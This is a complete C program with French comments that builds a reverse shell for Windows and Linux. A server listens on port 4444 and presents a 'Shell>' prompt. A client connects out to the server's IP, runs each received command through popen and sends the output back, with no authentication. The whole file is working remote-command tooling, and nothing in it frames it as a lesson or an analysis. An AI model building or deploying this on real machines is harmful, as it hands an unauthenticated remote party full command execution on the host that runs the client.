#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#ifdef _WIN32
  #include <winsock2.h>
  #include <ws2tcpip.h>
  /*
   * Sous Visual Studio :
   * #pragma comment(lib, "ws2_32.lib")
   */
  #define CLOSESOCK closesocket
  #define popen _popen   // Sous MinGW, popen() fonctionne parfois sans le _
  #define pclose _pclose // Sous MinGW, pclose() => _pclose
  #define SOCKET_ERROR_VALUE INVALID_SOCKET
#else
  #include <unistd.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>
  #include <netinet/in.h>
  #include <netdb.h>
  #define SOCKET int
  #define CLOSESOCK close
  #define SOCKET_ERROR_VALUE -1
#endif

#define SERVER_PORT 4444
#define BUFSIZE     1024

/* Prototypes */
int init_sockets();
void cleanup_sockets();
void run_server();
void run_client(const char *server_ip);

/*
 * main : parse arguments
 */
int main(int argc, char *argv[]) {
    if (init_sockets() != 0) {
        fprintf(stderr, "[!] Échec initialisation sockets.\n");
        return EXIT_FAILURE;
    }

    if (argc > 1 && strcmp(argv[1], "-s") == 0) {
        // Mode serveur
        run_server();
    }
    else if (argc > 2 && strcmp(argv[1], "-c") == 0) {
        // Mode client, argv[2] = IP du serveur
        run_client(argv[2]);
    }
    else {
        printf("Usage:\n");
        printf("  %s -s            (mode serveur)\n", argv[0]);
        printf("  %s -c <IP>       (mode client)\n", argv[0]);
    }

    cleanup_sockets();
    return EXIT_SUCCESS;
}

/*
 * init_sockets():
 *  - Windows : WSAStartup()
 *  - Linux : rien
 */
int init_sockets() {
#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        fprintf(stderr, "WSAStartup() failed.\n");
        return -1;
    }
#endif
    return 0;
}

/*
 * cleanup_sockets():
 *  - Windows : WSACleanup()
 *  - Linux : rien
 */
void cleanup_sockets() {
#ifdef _WIN32
    WSACleanup();
#endif
}

/*
 * run_server():
 *   - Écoute sur 0.0.0.0:4444
 *   - Attend un client
 *   - En boucle :
 *       1) Lit une commande sur stdin (serveur)
 *       2) L'envoie au client
 *       3) Lit la sortie renvoyée par le client et l'affiche
 *       4) Continue tant que commande != "exit" / "quit"
 */
void run_server() {
    SOCKET server_sock = socket(AF_INET, SOCK_STREAM, 0);
#ifdef _WIN32
    if (server_sock == INVALID_SOCKET) {
#else
    if (server_sock < 0) {
#endif
        perror("[Serveur] socket() failed");
        return;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family      = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port        = htons(SERVER_PORT);

    if (bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("[Serveur] bind() failed");
        CLOSESOCK(server_sock);
        return;
    }

    if (listen(server_sock, 1) < 0) {
        perror("[Serveur] listen() failed");
        CLOSESOCK(server_sock);
        return;
    }

    printf("[Serveur] En écoute sur le port %d...\n", SERVER_PORT);

    // Accepte un client
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    SOCKET client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &client_len);
#ifdef _WIN32
    if (client_sock == INVALID_SOCKET) {
#else
    if (client_sock < 0) {
#endif
        perror("[Serveur] accept() failed");
        CLOSESOCK(server_sock);
        return;
    }

    printf("[Serveur] Client connecté : %s\n", inet_ntoa(client_addr.sin_addr));

    // Boucle de lecture de commandes
    while (1) {
        // 1) Lire commande côté serveur (stdin)
        char command[BUFSIZE];
        memset(command, 0, sizeof(command));

        printf("Shell> ");
        fflush(stdout);

        if (!fgets(command, sizeof(command), stdin)) {
            // si erreur ou EOF
            printf("[Serveur] Fin de stdin, on arrête.\n");
            break;
        }
        // Retirer le \n éventuel
        size_t cmd_len = strlen(command);
        if (cmd_len > 0 && command[cmd_len-1] == '\n') {
            command[cmd_len-1] = '\0';
        }

        // 2) Envoyer la commande au client
        //    NB: on envoie la commande (terminée par \0) => +1 pour inclure \0
        if (send(client_sock, command, (int)strlen(command) + 1, 0) < 0) {
            perror("[Serveur] send() failed");
            break;
        }

        // Si la commande est "exit" ou "quit", on stoppe
        if (strcmp(command, "exit") == 0 || strcmp(command, "quit") == 0) {
            printf("[Serveur] Commande 'exit/quit' reçue. On stoppe.\n");
            break;
        }

        // 3) Recevoir la sortie renvoyée par le client, potentiellement sur plusieurs paquets
        //    On définit un protocole simpliste : le client envoie la sortie "ligne par ligne",
        //    et termine par une ligne spéciale "[_END_OF_CMD_]\n".

        printf("--- Début sortie client ---\n");
        while (1) {
            char buffer[BUFSIZE];
            memset(buffer, 0, sizeof(buffer));
            int recv_size = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
            if (recv_size <= 0) {
                // Erreur ou déconnexion
                printf("[Serveur] Connection fermée.\n");
                goto fin;
            }

            // On affiche la ligne
            // S'il s'agit de "[_END_OF_CMD_]" => la commande est terminée
            if (strncmp(buffer, "[_END_OF_CMD_]", 14) == 0) {
                break; // on sort de la boucle "lecture sortie"
            }
            printf("%s", buffer); // affiche la sortie (client a déjà le \n éventuel)
        }
        printf("--- Fin sortie client ---\n");
    }

fin:
    CLOSESOCK(client_sock);
    CLOSESOCK(server_sock);
}

/*
 * run_client():
 *   - Se connecte au serveur IP:4444
 *   - En boucle :
 *       1) Reçoit une commande
 *       2) Si "exit" / "quit", on ferme
 *       3) Sinon exécute la commande via popen()
 *       4) Envoie la sortie au serveur, ligne par ligne
 *       5) Envoie la ligne "[_END_OF_CMD_]" pour signaler la fin
 */
void run_client(const char *server_ip) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
#ifdef _WIN32
    if (sock == INVALID_SOCKET) {
#else
    if (sock < 0) {
#endif
        perror("[Client] socket() failed");
        return;
    }

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family      = AF_INET;
    serv_addr.sin_port        = htons(SERVER_PORT);
    serv_addr.sin_addr.s_addr = inet_addr(server_ip);

    printf("[Client] Tentative de connexion vers %s:%d...\n", server_ip, SERVER_PORT);

#ifdef _WIN32
    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
#else
    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
#endif
        perror("[Client] connect() failed");
        CLOSESOCK(sock);
        return;
    }

    printf("[Client] Connecté au serveur.\n");

    while (1) {
        // 1) Réception de la commande
        char command[BUFSIZE];
        memset(command, 0, sizeof(command));

        int recv_size = recv(sock, command, sizeof(command) - 1, 0);
        if (recv_size <= 0) {
            // Erreur ou déconnexion
            printf("[Client] Connexion fermée par le serveur.\n");
            break;
        }

        // 2) Vérifie si "exit" ou "quit"
        if (strcmp(command, "exit") == 0 || strcmp(command, "quit") == 0) {
            printf("[Client] Commande de fin reçue.\n");
            break;
        }

        // 3) Exécute la commande
        //    Sur Windows, `_popen()` lance un Shell dans le cmd.exe par défaut.
        //    Sur Linux, `popen()` lance /bin/sh -c <commande>.

        FILE *fp = popen(command, "r");
        if (!fp) {
            // Erreur d'exécution
            // On envoie au serveur un message d'erreur
            char *err_msg = "[Client] Erreur d'exécution de la commande\n";
            send(sock, err_msg, (int)strlen(err_msg), 0);

            // Envoie le marqueur de fin
            char *end_marker = "[_END_OF_CMD_]\n";
            send(sock, end_marker, (int)strlen(end_marker), 0);
            continue;
        }

        // 4) Lire la sortie de la commande ligne par ligne et envoyer au serveur
        char line[BUFSIZE];
        while (fgets(line, sizeof(line), fp)) {
            // Envoie la ligne au serveur
            if (send(sock, line, (int)strlen(line), 0) < 0) {
                perror("[Client] send() failed");
                break;
            }
        }
        pclose(fp);

        // 5) Envoyer la ligne "[_END_OF_CMD_]\n" pour signaler la fin
        char *end_marker = "[_END_OF_CMD_]\n";
        send(sock, end_marker, (int)strlen(end_marker), 0);
    }

    CLOSESOCK(sock);
    printf("[Client] Déconnexion.\n");
}
